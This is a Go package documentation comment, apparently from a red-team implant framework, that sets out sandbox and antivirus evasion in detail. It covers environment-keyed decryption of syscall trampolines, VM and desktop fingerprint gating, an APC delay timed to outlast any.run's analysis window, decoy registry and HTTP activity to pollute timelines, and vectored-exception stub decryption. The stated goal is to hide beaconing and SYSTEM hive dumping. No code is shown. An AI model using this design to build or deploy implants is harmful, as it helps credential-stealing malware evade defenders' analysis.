// Package behavioural implements environment-keyed staged-work gating and
// creative sandbox/VM behavioural evasion for authorized red-team labs.
//
// Commodity AV knows XOR+RC4, VirtualAlloc RWX, bare Nt* syscalls, and
// NtDelayExecution sleep. any.run additionally beats naive sleep by
// fast-forwarding timers, hooking user-mode APIs, and correlating behaviour:
// a binary that beacons then NtSaveKeys SYSTEM within 5s on a 2 vCPU / 4GB
// VM with uptime <3min and no mouse movement is sandbox-tagged regardless
// of packing.
//
// # Scoring gate
//
// scoreGate() is a pure, testable function that combines signals from
// anti.AllSignals() (debug/timing/opaque) and PlatformGate() (hardware/VM)
// into a weighted confidence score. Strong VM artifacts (SMBIOS VM string,
// CPUID hypervisor, registry VM artifacts, VM files/drivers, VM processes)
// cause immediate fail-closed denial regardless of score. Otherwise, real-
// desktop signals accumulate positive weight; VM-ish signals subtract. Staged
// work is allowed only when the score meets RealMachineThreshold (default +20).
//
// # Environmental keying
//
// HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid + volume serial +
// ComputerName are HKDF-SHA256'd into the 32-byte key that decrypts staged
// syscall trampolines. any.run template VMs derive a different key → execution
// is benign (no NtSaveKey). Non-Windows uses a deterministic fixture key for
// tests.
//
// # Interactive-desktop gate
//
// GetLastInputInfo / GetForegroundWindow / GetTickCount64 require foreground
// activity within 5min and uptime >8min. Hardware checks verify real GPU
// (not "Microsoft Basic Display Adapter"), real audio device, battery presence,
// thermal zones, normal resolution, >20 installed apps, and typical user files.
//
// # Delayed APC
//
// On Windows, real work is queued via WaitableTimer + QueueUserAPC 110-150s
// after the gate — beyond any.run's default 60-90s window. The main beacon
// thread's trace is SleepEx only. Falls back to StallBeyondSandbox on
// non-Windows or if APC setup fails.
//
// # Benign mimicry
//
//   - 20 decoy HKCU registry opens (real NtOpenKey via direct syscall on
//     Windows, benign os.Stat on other platforms) precede any sensitive call.
//   - MimicDecoyHTTP issues a few benign HTTP GETs to public Microsoft
//     connectivity/CRL endpoints (msftconnecttest.com, ctldl.windowsupdate.com)
//     for timeline pollution. URLs are configurable via SetDecoyURLs. Egress is
//     inert unless ADVERSE_DECOY_HTTP=1 (exact match); no other gate applies.
//
// # VEH stub decryption
//
// Trampolines are RotatingXOR+env-key encrypted. ArmEncryptedTrampoline
// registers a VectoredExceptionHandler on int3 (EXCEPTION_BREAKPOINT) that
// decrypts the region in-place. Linear sweep sees no syscall opcode until
// the exception fires on real hardware. Tests verify decryption logic only;
// no shellcode execution in tests.
//
// # Lab safety
//
// Gate() is advisory. Behavioural gating only adds delay/benign fallback and
// never enables network egress by itself. All checks fail open on API errors
// (return Triggered=false, not panic).
package behavioural
